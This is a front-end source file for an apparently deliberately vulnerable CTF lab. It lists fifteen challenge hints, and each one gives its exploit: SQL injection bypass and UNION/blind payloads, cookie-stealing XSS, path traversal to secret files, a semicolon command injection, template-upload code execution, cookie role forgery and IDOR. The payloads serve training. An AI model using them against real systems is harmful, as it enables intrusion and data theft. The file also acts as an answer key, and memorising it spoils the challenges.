// Direct hints only. No flag values are ever shipped to the browser.
// Empty means same-origin. Set VITE_API_URL only when the API is on a different origin.
export const API = import.meta.env.VITE_API_URL ?? ''

export const HINTS = [
  {
    id: 1,
    title: 'Source Recon',
    category: 'RECON',
    points: 50,
    hint: 'Open DevTools → Elements on this page and read the HTML comment near the top of the document.',
    target: 'Inspect this page',
    href: '/'
  },
  {
    id: 2,
    title: 'Robots Are Friendly',
    category: 'RECON',
    points: 50,
    hint: 'Request /robots.txt. The final line is not an instruction — it is the flag.',
    target: 'Open /robots.txt',
    href: `${API}/robots.txt`
  },
  {
    id: 3,
    title: 'Admin Bypass',
    category: 'SQLi',
    points: 100,
    hint: `At /api/login use username: ' OR '1'='1' --  and any password. Then open /admin.`,
    target: 'Go to login lab',
    href: '/lab#login'
  },
  {
    id: 4,
    title: 'Cookie Forgery',
    category: 'ACCESS CONTROL',
    points: 75,
    hint: 'Log in normally as varun / hunter2, change the role cookie from user to admin, then open /member.',
    target: 'Go to login lab',
    href: '/lab#login'
  },
  {
    id: 5,
    title: 'Profile Hopping',
    category: 'IDOR',
    points: 75,
    hint: 'Open /api/users/1, then change the 1 to 2. Read the private_note field.',
    target: 'Open /api/users/2',
    href: `${API}/api/users/2`
  },
  {
    id: 6,
    title: 'Error Based SQLi',
    category: 'SQLi',
    points: 100,
    hint: 'In the search box submit a single apostrophe ( ʼ ). The SQLite error response contains a debug_flag field.',
    target: 'Go to search lab',
    href: '/lab#search'
  },
  {
    id: 7,
    title: 'Union Based SQLi',
    category: 'SQLi',
    points: 125,
    hint: `In the search box paste:  ' UNION SELECT id, flag, flag FROM secret_flags -- `,
    target: 'Go to search lab',
    href: '/lab#search'
  },
  {
    id: 8,
    title: 'Boolean Blind SQLi',
    category: 'SQLi',
    points: 150,
    hint: `Use /api/item?id=1 and append: AND substr((SELECT flag FROM secret_flags WHERE id=8),N,1)='X'. found:true means the character matched.`,
    target: 'Go to blind lab',
    href: '/lab#item'
  },
  {
    id: 9,
    title: 'Stored XSS',
    category: 'XSS',
    points: 100,
    hint: 'Post this as a comment: <img src=x onerror="alert(window.__SECRET__)">  — comments render as raw HTML.',
    target: 'Go to comments lab',
    href: '/lab#comments'
  },
  {
    id: 10,
    title: 'Reflected XSS',
    category: 'XSS',
    points: 100,
    hint: `Open /greet?name=<img src=x onerror="alert(document.cookie)">  — the xss_flag cookie is the flag.`,
    target: 'Open reflected XSS endpoint',
    href: `${API}/greet?name=guest`
  },
  {
    id: 11,
    title: 'Local File Inclusion',
    category: 'FILE',
    points: 125,
    hint: 'Open /page?page=about, then use: ../../data/secrets/lfi_flag.txt',
    target: 'Go to file lab',
    href: '/lab#page'
  },
  {
    id: 12,
    title: 'Download Traversal',
    category: 'FILE',
    points: 100,
    hint: 'Open /download?file=manifesto.txt, then use: ../secrets/download_flag.txt',
    target: 'Go to file lab',
    href: '/lab#download'
  },
  {
    id: 13,
    title: 'Command Injection',
    category: 'RCE',
    points: 150,
    hint: 'Open /api/ping?host=127.0.0.1; cat data/secrets/cmd_flag.txt',
    target: 'Go to ping lab',
    href: '/lab#ping'
  },
  {
    id: 14,
    title: 'Upload + Template RCE',
    category: 'RCE',
    points: 175,
    hint: 'Upload shell.ejs containing <%= process.env.CTF_FLAG_14 %>, then open /render?view=shell.ejs',
    target: 'Go to upload lab',
    href: '/lab#upload'
  },
  {
    id: 15,
    title: 'The Final Chain',
    category: 'CHAIN',
    points: 200,
    hint: `Read /backup/db.js.bak, then search:  ' UNION SELECT id, note, note FROM vault -- `,
    target: 'Open backup file',
    href: `${API}/backup/db.js.bak`
  }
]

export const CATEGORIES = ['ALL', ...new Set(HINTS.map((h) => h.category))]
export const TOTAL_POINTS = HINTS.reduce((sum, h) => sum + h.points, 0)
